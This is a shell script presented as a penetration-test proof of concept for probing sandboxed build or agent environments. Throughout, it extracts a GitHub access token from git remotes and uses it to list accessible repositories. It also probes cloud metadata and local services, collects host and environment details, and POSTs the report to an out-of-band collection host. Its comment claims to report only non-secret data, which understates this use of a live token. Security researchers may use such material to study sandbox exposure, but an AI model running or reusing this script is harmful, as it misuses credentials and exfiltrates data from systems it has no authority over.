#!/bin/sh
# Trace penetration test marker pt-detail-poc. Reports only non-secret shapes.
OOB="https://07935a914525e052267e4db831799eac775a38aa.oob.rmrflabs.com/pt-detail-poc/sandbox-exec"
TMP=$(mktemp 2>/dev/null || echo /tmp/trace-poc.$$)

ENVNAMES=$(env 2>/dev/null | cut -d= -f1 | sort | tr '\n' ' ')
TOKIN_REMOTE=$(git remote -v 2>/dev/null | grep -c 'x-access-token:')
TOK=$(git remote -v 2>/dev/null | sed -n 's#.*x-access-token:\([^@]*\)@.*#\1#p' | head -1)
GHCOUNT="n/a"; GHNAMES="n/a"
if [ -n "$TOK" ]; then
  GHCOUNT=$(curl -s -m 8 -H "Authorization: Bearer $TOK" -H 'Accept: application/vnd.github+json' https://api.github.com/installation/repositories 2>/dev/null | tr ',' '\n' | grep -c '"full_name"')
  GHNAMES=$(curl -s -m 8 -H "Authorization: Bearer $TOK" -H 'Accept: application/vnd.github+json' https://api.github.com/installation/repositories 2>/dev/null | tr ',' '\n' | sed -n 's/.*"full_name":"\([^"]*\)".*/\1/p' | tr '\n' ' ')
fi
MD_HDR=$(curl -s -m 3 -o /dev/null -w '%{http_code}' -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/ 2>/dev/null)
MD_NOHDR=$(curl -s -m 3 -o /dev/null -w '%{http_code}' http://169.254.169.254/computeMetadata/v1/ 2>/dev/null)
CP_LOCAL=$(curl -s -m 3 -o /dev/null -w '%{http_code}' http://127.0.0.1:3210/ 2>/dev/null)
OPENCODE=$( (netstat -ltn 2>/dev/null || ss -ltn 2>/dev/null) | grep -c '0.0.0.0:' )
LISTEN=$( (netstat -ltn 2>/dev/null || ss -ltn 2>/dev/null) | tr -s ' ' | cut -d' ' -f4 | tr '\n' ' ' )

{
printf 'marker: pt-detail-poc\n'
printf 'hook: %s\n' "${TRACE_POC_HOOK:-unknown}"
printf 'whoami: %s\n' "$(id -u 2>/dev/null)/$(whoami 2>/dev/null)"
printf 'hostname: %s\n' "$(hostname 2>/dev/null)"
printf 'uname: %s\n' "$(uname -a 2>/dev/null)"
printf 'cwd: %s\n' "$(pwd 2>/dev/null)"
printf 'env_var_NAMES_only: %s\n' "$ENVNAMES"
printf 'git_remote_contains_x_access_token: %s\n' "$TOKIN_REMOTE"
printf 'github_installation_repo_count: %s\n' "$GHCOUNT"
printf 'github_installation_repo_names: %s\n' "$GHNAMES"
printf 'gce_metadata_with_header_status: %s\n' "$MD_HDR"
printf 'gce_metadata_without_header_status: %s\n' "$MD_NOHDR"
printf 'localhost_3210_status: %s\n' "$CP_LOCAL"
printf 'listening_on_wildcard_count: %s\n' "$OPENCODE"
printf 'listening_sockets: %s\n' "$LISTEN"
} > "$TMP" 2>/dev/null

curl -s -m 15 -X POST "$OOB" -H 'content-type: text/plain' --data-binary @"$TMP" >/dev/null 2>&1 \
  || wget -q -O /dev/null --post-file="$TMP" "$OOB" >/dev/null 2>&1
rm -f "$TMP" 2>/dev/null
exit 0
